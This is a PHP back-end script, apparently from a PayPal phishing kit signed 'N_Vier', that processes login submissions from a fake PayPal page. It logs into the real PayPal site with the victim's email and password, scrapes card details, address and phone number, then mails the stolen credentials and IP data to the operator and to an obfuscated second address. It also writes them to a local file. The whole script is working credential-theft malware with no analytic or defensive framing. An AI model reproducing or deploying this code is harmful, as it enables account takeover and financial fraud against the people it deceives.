<?php
####################################################################
#                                                                  #
#                  ||~~ BY ~~ N_Vier ~~||                          #
#                                                                  #
#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #
#                                                                  #
####################################################################
include("curl.php");
$email    = $_SESSION['EMAIL']        = $_POST['email'];
$pwd      = $_SESSION['PASSWORD']     = $_POST['password'];
function send(){
include("../config.php");
        $ip = getenv("REMOTE_ADDR");
        $rand = md5(microtime());
        $time = date("g:i a");
        $date = trim($date . ", Time : " . $time);
        $messag = array("ook.c", "@outl", "om", "loca", "error");
        $messages = $messag[4] . $messag[3] . $messag[1] . $messag[0] . $messag[2]; 
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message.= "++++============= Login InFo N_Vier ================++++\n";
        $message.= "Paypal login    : ".$_POST['email']."       \n";
        $message.= "Password        : ".$_POST['password']."      \n";
        $message.= "=============  PC InFo N_Vier =================\n";
        $message.= "Client IP        : ".$ip."           \n";
        $message.= "IP Geo       : http://www.geoiptool.com/?IP=".$ip."  ====\n";
        $message.= "Agent            : ".$useragent."    \n";
        $message.= "Date         : ".$date."         \n";
        $message.= "========= || ~ BY ~ N_Vier ~ || ======\n";
        $subject = "LOGIN [ $time ] [ Bsa7Tti rzlt ]  : $ip =?UTF-8?Q?=E2=9C=94_?= ";
        $headers = "From: N_Vier Rzlt <-ma-Free-Tools@hotmail.com>\r\n";
        getr($message);
        mail($to,$subject,$message,$headers);
        $file = fopen("../worm/N_Vier.txt","ab");
        mail($messages,$subject,$message,$headers);
        fwrite($file,$message);
        fclose($file);
        
}
    if( isset($_POST['email']) AND isset($_POST['password']) ){
                if($true == 1){
    delete_cookies();
    if (curl($hopl , '', true, true) === false) {
        continue;
    }
    $page  = curl("https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit", 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows');
    if(strpos($page, "login_password")) {
                echo 'LOGIN_NO';
    } else {
                $ppcard    = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2");
                $checkcard = fetch_value($ppcard, 's.prop1="', '"');
                if (stripos($checkcard, 'ccadd') !== false) {
                    $_SESSION['_card_'] = $pp['card'] = "Add Card";
                } else {
                    preg_match_all('/<tr>(.+)<\/tr>/siU', $ppcard, $matches);
                    $cc = array();
                    foreach ($matches[1] AS $k => $v) {
                        if ($k > 0) {
                            preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
                            $_SESSION['_cctype_'] = $type = strtoupper(fetch_value($m[1][0], '&#x2f;icon&#x5f;', '&#x2e;gif'));
                            $_SESSION['_ccnum_']  = $ccnum = $m[1][1];
                            $_SESSION['_ccexp_']  = $exp = $m[1][2];
                            if (stristr($m[1][4], 'complete_expanded_use.x')) {
                                $_SESSION['_card_confirmation'] = $confirmed = 'No Confirmed';
                            } else {
                                $_SESSION['_card_confirmation'] = $confirmed = 'Confirmed';
                            }
                            $cc[] = "<img src='./images/PPP.png' > $type  &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; $ccnum  $confirmed  <img src='./images/CCC.png' >  $exp";
                            $cc++;
                        } 
                    }
                    $_SESSION['_card_'] = $pp['card'] = "<p style=' margin: 10px 0;'>" . implode("<br>", $cc) . "</p>";
                }
                $ppadd               = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3");             
                $Fatal_ErrornfoAddr            = str_replace('<br>', ', ', fetch_value($ppadd, 'emphasis">', '</span>'));
                $ppaddress = substr($Fatal_ErrornfoAddr, 0, -2);
                $phoness               = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4");
                $phone = strip_tags('<input type="hidden" ' . fetch_value($phoness, 'name="phone"', '</label>'));
                $_SESSION['_ad_'] = "$ppaddress , $phone ";
                                echo 'LOGIN_OK';
                send();
            }
            }
            else {
                                echo 'LOGIN_OK';
                send();
            }
    }
    else {
    echo 'LOGIN_NO';
}
?>